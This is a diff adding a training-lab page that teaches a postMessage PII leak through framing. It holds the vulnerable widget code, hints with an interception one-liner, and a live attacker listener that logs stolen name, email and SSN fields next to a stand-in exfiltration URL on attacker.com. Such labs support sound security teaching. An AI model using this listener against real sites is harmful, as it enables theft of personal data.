@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: postMessage PII Leak via Framing - CORS Level 3</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">CORS #3: postMessage PII Leak via Framing</span>
+      <span class="difficulty medium">Medium</span>
+    </div>
+  </div>
+  <div id="solve-banner" class="solve-banner"></div>
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>A form widget broadcasts submission data via <code>postMessage</code> with <code>targetOrigin="*"</code> and has no <code>X-Frame-Options</code> header. Frame the widget page and intercept the PII (name, email, phone, SSN) when the form is submitted.</p>
+      </div>
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The vulnerability pair</button>
+        <div class="hint-content">Two issues combine: (1) The widget at <code>/api/form-widget</code> uses <code>postMessage(data, '*')</code> — broadcasting form data to ANY parent window. (2) There's no <code>X-Frame-Options</code> or <code>frame-ancestors</code> CSP, so anyone can iframe the widget.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The attack</button>
+        <div class="hint-content">Embed the widget in an iframe on your attacker page. Listen for postMessage events. When the user submits the form, the widget broadcasts the PII to your parent page. You don't need XSS — just framing + listening.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Interception code</button>
+        <div class="hint-content"><code>window.addEventListener('message', (e) => { if (e.data.type === 'formSubmission') { steal(e.data.data); } });</code> — The parent page receives ALL postMessages from the iframe because targetOrigin is '*'.</div>
+      </div>
+      <h3>Vulnerable Code</h3>
+      <div class="source-code">
+<pre><span class="comment">// Widget form submission handler</span>
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  <span class="keyword">var</span> data = <span class="keyword">new</span> FormData(form);
+
+  <span class="comment">// VULNERABLE: broadcasts PII to ANY parent</span>
+  window.parent.<span class="sink">postMessage</span>(
+    { type: 'formSubmission', data: formData },
+    <span class="sink">'*'</span>  <span class="comment">// Any origin!</span>
+  );
+});
+
+<span class="comment">// MISSING: No X-Frame-Options header</span>
+<span class="comment">// MISSING: No Content-Security-Policy frame-ancestors</span>
+</pre>
+      </div>
+    </div>
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128196; Legitimate Form Widget</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">This is how the form widget looks when embedded on a legitimate page. It collects PII and sends it via postMessage to the parent.</p>
+          <div class="iframe-container" style="min-height:auto">
+            <iframe id="widget-frame" src="/api/form-widget" style="width:100%;min-height:280px;border:none"></iframe>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <div class="lab-form" style="border:2px solid var(--danger);background:var(--danger-light)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Attacker's Framing Attack</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">This page is acting as the attacker — it frames the widget and listens for postMessage events. When someone submits the form above, the PII is intercepted here.</p>
+          <p style="font-size:13px;color:var(--text-secondary)">Submit the form above and watch the PII appear below!</p>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Intercepted postMessages</div>
+            <div id="intercepted-data"><div class="log" style="color:#94a3b8">Listening for postMessage events from iframe...</div></div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px">
+          <p style="font-size:13px;color:var(--text-secondary)"><strong>Real-world context:</strong> This pattern was found in HubSpot, Typeform, and Tawk.to widgets. When a widget uses <code>postMessage(data, '*')</code> and the page is frameable, ANY website can embed the widget and steal form submissions. Impact: PII theft (names, emails, phone numbers, SSNs, credit cards) from any form that uses the vulnerable widget. Found on TryHackMe, SHEIN, BlueSnap, and others.</p>
+          <p style="font-size:13px;color:var(--text-secondary);margin-top:8px"><strong>Bug bounty tip:</strong> Search for <code>postMessage(</code> with <code>'*'</code> in third-party widget scripts. Then check if the page has <code>X-Frame-Options</code> or <code>frame-ancestors</code> CSP. If both are missing, you have a frameable PII leak.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="/js/app.js"></script>
+  <script>
+    // Attacker: Listen for postMessage events from the framed widget
+    window.addEventListener('message', function(e) {
+      var log = document.getElementById('intercepted-data');
+
+      if (e.data && e.data.type === 'widgetReady') {
+        log.innerHTML += '<div class="log" style="color:#4ade80">Widget loaded in iframe — ready to intercept!</div>';
+        return;
+      }
+
+      if (e.data && e.data.type === 'formSubmission') {
+        log.innerHTML += '<div class="log" style="color:#ef4444">--- PII INTERCEPTED ---</div>';
+        var pii = e.data.data;
+        for (var key in pii) {
+          log.innerHTML += '<div class="log" style="color:#ef4444">' + key + ': ' + pii[key] + '</div>';
+        }
+        log.innerHTML += '<div class="log" style="color:#ef4444">--- END STOLEN DATA ---</div>';
+        log.innerHTML += '<div class="log" style="color:#ef4444">Would exfiltrate to: https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(pii)) + '</div>';
+
+        solveLab('cors-3');
+      } else if (e.data) {
+        log.innerHTML += '<div class="log">Message from ' + e.origin + ': ' + JSON.stringify(e.data).substring(0, 100) + '</div>';
+      }
+    });
+  </script>
+</body>
+</html>
